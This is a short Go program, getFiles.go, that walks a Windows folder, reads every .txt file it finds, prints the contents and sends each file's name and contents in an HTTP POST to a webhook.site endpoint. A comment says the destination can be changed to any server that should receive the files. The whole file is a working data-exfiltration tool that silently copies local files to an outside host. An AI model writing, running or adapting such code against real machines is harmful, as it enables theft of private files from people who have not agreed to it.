package main

import (
	"bytes"
	"fmt"
	"log"
	"net/http"
	"path/filepath"
	"regexp"
	"os"
)

//Authors: Aram Maljanian
//usage: go run getFiles.go

var regexes = []*regexp.Regexp{
	regexp.MustCompile(`\.txt$`), //regex for finding all .txt files
}

func main() {

	root := "C:\\Users\\User1\\Desktop\\testFolder" //Specifying root directory to search through
	if err := filepath.Walk(root, walkFn); err != nil {
		log.Panicln(err)
	}

}

func walkFn(path string, f os.FileInfo, err error) error {
	for _, r := range regexes {
		if r.MatchString(path) {
			fmt.Printf("%s\n", path)
			readAFile(path)

		}
	}
	return nil
}

//Source: https://gobyexample.com/reading-files
func readAFile(path string) {
	dat, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(dat))
	httpPoster(string(dat), path)

}

func httpPoster(fileData string, filename string) {
	data := []byte(filename + ":" + fileData)

	//The web address in http.NewRequest can be changed to the destination server where the files should be sent
	req, err := http.NewRequest("POST", "https://webhook.site/d2524545-acb5-4ac8-8585-91c68d106f0d", bytes.NewBuffer(data))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}

	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

}
